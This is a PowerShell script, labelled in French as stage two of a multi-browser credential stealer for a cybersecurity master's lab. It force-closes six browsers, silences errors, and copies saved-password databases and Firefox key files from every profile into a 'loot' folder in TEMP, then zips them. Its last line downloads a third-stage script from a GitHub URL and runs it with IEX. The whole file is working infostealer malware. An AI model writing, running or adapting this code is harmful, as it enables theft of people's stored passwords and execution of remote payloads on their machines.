# ============================================
# Stage 2 - Stealer Multi-Navigateurs
# Tous les profils pour tous les navigateurs
# Lab pedagogique Master Cybersecurite
# ============================================

$ErrorActionPreference = "SilentlyContinue"

# Dossier de sortie
$output = "$env:TEMP\loot"
New-Item -ItemType Directory -Force -Path $output | Out-Null

# Fermer tous les navigateurs
$procs = @("chrome", "firefox", "brave", "opera", "vivaldi", "msedge")
foreach ($proc in $procs) { Stop-Process -Name $proc -Force }
Start-Sleep -Seconds 2

# ---- FONCTION GENERIQUE Chromium ----
function Steal-Chromium($name, $basePath, $profileFilter) {
    if (-not (Test-Path $basePath)) { return }
    
    $profiles = Get-ChildItem $basePath -Directory | Where-Object {
        $_.Name -match $profileFilter
    }
    
    foreach ($profile in $profiles) {
        $loginData = "$($profile.FullName)\Login Data"
        if (Test-Path $loginData) {
            Copy-Item $loginData "$output\${name}_$($profile.Name)_LoginData" -Force
            Write-Host "[+] $name $($profile.Name) credentials copied"
        }
    }
}

# ---- NAVIGATEURS Chromium → tous profils ----
Steal-Chromium "Chrome"  "$env:LOCALAPPDATA\Google\Chrome\User Data"                    "^Default$|^Profile \d+$"
Steal-Chromium "Edge"    "$env:LOCALAPPDATA\Microsoft\Edge\User Data"                   "^Default$|^Profile \d+$"
Steal-Chromium "Brave"   "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"      "^Default$|^Profile \d+$"
Steal-Chromium "Vivaldi" "$env:LOCALAPPDATA\Vivaldi\User Data"                          "^Default$|^Profile \d+$"

# ---- OPERA ----
$operaLogin = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
if (Test-Path $operaLogin) {
    Copy-Item $operaLogin "$output\Opera_LoginData" -Force
    Write-Host "[+] Opera credentials copied"
}

# ---- FIREFOX ----
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxPath) {
    foreach ($profile in (Get-ChildItem $firefoxPath -Directory)) {
        $logins = "$($profile.FullName)\logins.json"
        $key    = "$($profile.FullName)\key4.db"
        if (Test-Path $logins) {
            Copy-Item $logins "$output\Firefox_$($profile.Name)_logins.json" -Force
            Copy-Item $key    "$output\Firefox_$($profile.Name)_key4.db"    -Force
            Write-Host "[+] Firefox $($profile.Name) credentials copied"
        }
    }
}

# ---- RAPPORT ----
$found = Get-ChildItem $output
Write-Host "`n[+] $($found.Count) fichiers recuperes"

# Compression
Compress-Archive -Path $output -DestinationPath "$env:TEMP\loot.zip" -Force
Write-Host "[+] Loot compresse : $env:TEMP\loot.zip"

# Appel Stage 3
$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/stage3.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)